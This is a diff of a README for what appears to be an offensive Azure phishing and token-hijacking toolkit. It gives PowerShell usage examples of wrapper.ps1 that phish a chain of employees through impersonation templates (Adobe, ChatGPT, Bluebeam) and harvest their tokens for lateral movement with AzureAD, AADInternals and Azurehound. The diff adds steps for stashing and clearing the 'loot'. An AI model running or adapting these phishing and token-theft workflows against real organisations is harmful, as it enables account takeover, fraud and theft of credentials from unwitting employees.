@@ -14,9 +14,19 @@ You can use a *very* important project manager as your initial access vector, or
 
 The variable firstuser is the initial one you want to hijack, targetUser is the eventual target you hope to reach. Template will be sent first in the background, if the user approves, the message passed here will be emailed to them as the first victim.
 
-WARNING: When you get your first bite, SAVE THAT TOKEN LOG. Get the users tokens, and use them for your foothold. You should have a ton of recon, use this info with these tokens and az cli/AzureAD module to make your next moves. The TokenLog gets refreshed every time you run the script. You'll lose them if you arent mindful.  
+WARNING: When you get your first bite, SAVE THAT TOKEN LOG. Get the users tokens, and use them for your foothold. You should have a ton of recon, use this info with these tokens and az cli/AzureAD module to make your next moves. The TokenLog gets refreshed every time you run the script. You'll lose them if you arent mindful. There's a couple scripts to help with this. The first one creates a loot folder and backs up the loot files. It clears them for the next run. This loot folder is in the .gitignore but you should get in the habit of clearing after each run (or open a PR and add a switch case for it)
 
-# Install requirements, perform full recon using azuread, AADInternals, and Azurehound modules, attempt to use payroll account to phish a particular accountant
+##### Stash loot in the 'loot' folder  
+```powershell
+.\LootStash.ps1
+```
+
+##### Clear all loog and that folder when you're done
+```powershell
+.\ClearLoot.ps1
+```
+
+##### Install requirements, perform full recon using azuread, AADInternals, and Azurehound modules, attempt to use payroll account to phish a particular accountant
 ```powershell
 $targetUser = "accountant@corpomax.com"
 $firstUser = "payroll@corpomax.com"
@@ -27,7 +37,7 @@ $template = "adobe" # or chatgpt, bluebeam, bbb, one of the secret ones
 .\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template -azurehound -recon -azuread -install
 ```
 
-# With Azurehound and No Installation, phish a PM to phish IT for installation of required software
+##### With Azurehound and No Installation, phish a PM to phish IT for installation of required software
 ```powershell
 $targetUser = "helpdesk@corpomax.com"
 $firstUser = "MaxBedroom@corpomax.com"
@@ -38,7 +48,7 @@ $template = "bluebeam" # or chatgpt, bluebeam, bbb, one of the secret ones
 .\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template -azurehound
 ```
 
-# Phishing Only
+##### Phishing Only
 Similar scenario, but trying  to use a new employee to get to a full administrator user via the 'chatgpt' template, a little quicker with no installation or Azurehound switch 
 
 ```powershell
